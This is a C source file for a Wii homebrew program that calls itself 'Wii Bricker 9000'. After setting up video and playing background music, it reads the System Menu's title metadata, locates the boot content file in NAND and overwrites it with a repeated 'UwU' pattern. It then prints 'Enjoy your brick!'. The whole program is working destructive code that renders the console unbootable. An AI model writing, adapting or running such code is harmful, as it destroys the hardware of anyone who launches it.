#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <fat.h>
#include <asndlib.h>
#include <wiiuse/wpad.h>
#include <sys/param.h>
#include "libmidi.h"

#define __APPNAME__ "PikoBricker"

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

//---------------------------------------------------------------------------------
int main(int argc, char **argv) {
//---------------------------------------------------------------------------------

	// Initialise the video system
	VIDEO_Init();

    // Initialize the audio subsystem.
    ASND_Init();

	// This function initialises the attached controllers
	WPAD_Init();

	// Init ISFS.
	ISFS_Initialize();

	fatInitDefault();

	// Obtain the preferred video mode from the system
	// This will correspond to the settings in the Wii menu
	rmode = VIDEO_GetPreferredMode(NULL);

	// Allocate memory for the display in the uncached region
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

	// Initialise the console, required for printf
	console_init(xfb,20,20,rmode->fbWidth,rmode->xfbHeight,rmode->fbWidth*VI_DISPLAY_PIX_SZ);

	// Set up the video registers with the chosen mode
	VIDEO_Configure(rmode);

	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_RED);

	// Tell the video hardware where our display memory is
	VIDEO_SetNextFramebuffer(xfb);

	// Make the display visible
	VIDEO_SetBlack(FALSE);

	// Flush the video register changes to the hardware
	VIDEO_Flush();

	// Wait for Video setup to complete
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();

    // Play BGM.
    //PlayOgg(bgm_ogg, bgm_ogg_size, 0, 0);
	libmidi_init("sd:/wildmidi.cfg", 44100);
	// Render and play levan polka.
	libmidi_renderMidi("sd:/Mario Kart Wii - Moonview Highway.mid", false);
	libmidi_play();

    // Print app info.
    printf("%s [Called %s();]: Compiled on %s", __APPNAME__, __FUNCTION__, __DATE__);


	// The console understands VT terminal escape codes
	// This positions the cursor on row 2, column 0
	// we can use variables for this with format codes too
	// e.g. printf ("\x1b[%d;%dH", row, column );
	printf("\x1b[2;0H");


	// printf("Hello World!");
	int conX, conY;
	CON_GetMetrics(&conX, &conY);

	puts("\x1b[41;1m\tWii Bricker 9000");
	for (int i = 0; i < conX; i++)
		putchar('=');

	uint32_t tmdsize = 0;
	int ret = ES_GetStoredTMDSize(0x100000002LL, &tmdsize);
	if (ret < 0) {
		printf("Failed to get system menu tmd size! (%i)\n", ret);
		return ret;
	}

	signed_blob* s_tmd = memalign(0x20, tmdsize);
	if (!s_tmd) {
		puts("Out of memory!");
		return -12;
	}

	ret = ES_GetStoredTMD(0x100000002LL, s_tmd, tmdsize);
	if (ret < 0) {
		printf("Failed to get system menu tmd! (%i)\n", ret);
		return ret;
	}

	tmd* sm_tmd = SIGNATURE_PAYLOAD(s_tmd);

	uint32_t bootIndexCID = 0;
	size_t bootIndexSize = 0;
	for (int i = 0; i < sm_tmd->num_contents; i++) {
		tmd_content* con = sm_tmd->contents + i;
		if (con->index == sm_tmd->boot_index) {
			bootIndexCID = con->cid;
			bootIndexSize = con->size;
		}
	}

	if (!bootIndexCID) {
		puts("Failed to identify boot content!");
		return -2;
	}

	char filepath[ISFS_MAXPATH];
	sprintf(filepath, "/title/00000001/00000002/content/%08x.app", bootIndexCID);
	int fd = ret = ISFS_Open(filepath, ISFS_OPEN_WRITE);
	if (ret < 0) {
		printf("Failed to open boot content! (%i)\n", ret);
		return ret;
	}

	printf("\tCorrupting %s...\n\n", filepath);

	const char pattern[0x4000];
	const char str[] = "UwU";
	for (char* ptr = pattern; ptr < (pattern + sizeof(pattern)); ptr += sizeof(str))
		memcpy(ptr, str, sizeof(str));

	while (bootIndexSize) {
		ret = ISFS_Write(fd, pattern, MIN(sizeof(pattern), bootIndexSize));
		if (ret <= 0)
			break;

		bootIndexSize -= ret;
	}

	printf("\tDone! Enjoy your brick! %.*s\n", sizeof(pattern), pattern);



	while(1) {

		// Call WPAD_ScanPads each loop, this reads the latest controller states
		WPAD_ScanPads();

		// WPAD_ButtonsDown tells us which buttons were pressed in this loop
		// this is a "one shot" state which will not fire again until the button has been released
		u32 pressed = WPAD_ButtonsDown(0);

		// We return to the launcher application via exit
		if ( pressed & WPAD_BUTTON_HOME ) exit(0);

		// Wait for the next frame
		VIDEO_WaitVSync();
	}

	return 0;
}